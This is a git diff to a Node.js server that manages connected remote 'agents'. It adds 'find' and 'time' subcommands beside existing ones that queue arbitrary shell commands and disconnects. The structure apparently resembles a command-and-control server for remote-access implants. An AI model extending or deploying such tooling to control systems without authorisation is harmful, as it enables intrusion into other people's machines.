@@ -124,14 +124,18 @@ app.listen(PORT, () => {
 // ---------- event handlers ---------- //
 
 eventEmitter.on('agent', (action, ...args) => {
-  action = action.trim();
-
   if (action == null) {
     console.log('Usage: agent list\n' +
                 '       agent cmd <ID> <command>\n' +
-                '       agent disconnect <ID>\n');
+                '       agent disconnect <ID>\n' +
+                '       agent find <ID> <command>\n' +
+                '       agent time <ID> <seconds>\n');
     return;
-  } else if (action === "list") {
+  } 
+
+  action = action.trim();
+
+  if (action === "list") {
     console.log('Connected agents:');
     for (let id in agents) {
       console.log(`Agent ${id}: ${JSON.stringify(agents[id])}`)
@@ -142,6 +146,7 @@ eventEmitter.on('agent', (action, ...args) => {
       console.log('Usage: agent cmd <ID> <command>');
       return;
     }
+
 
     const id = args[0];
     if (agents[id] == null) {
@@ -167,6 +172,38 @@ eventEmitter.on('agent', (action, ...args) => {
 
     console.log(`Disconnecting agent with ID ${id}`);
     agents[id].commands.push(`disconnect&${id}`);
+  } else if (action === "find") {
+    if(args.length === 0) {
+      console.log('Usage: agent find <ID> <fileName>');
+      return
+    }
+
+    const id = args[0];
+    if (agents[id] == null) {
+      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
+      return;
+    }
+
+    const fileNames = args.slice(1).join(' ');
+
+    console.log(`Executing find of ${fileNames} on agent ${id}`);
+    agents[id].commands.push(`find&find ${fileNames}`);
+  } else if (action === "time") {
+    if(args.length === 0) {
+      console.log('Usage: agent time <ID> <seconds>');
+      return
+    }
+
+    const id = args[0];
+    if (agents[id] == null) {
+      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
+      return;
+    }
+
+    const seconds = args.slice(1).join(' ');
+
+    console.log(`Chainging wait time to ${seconds} on agent ${id}`);
+    agents[id].commands.push(`time&${seconds}`);
   }
 });
 
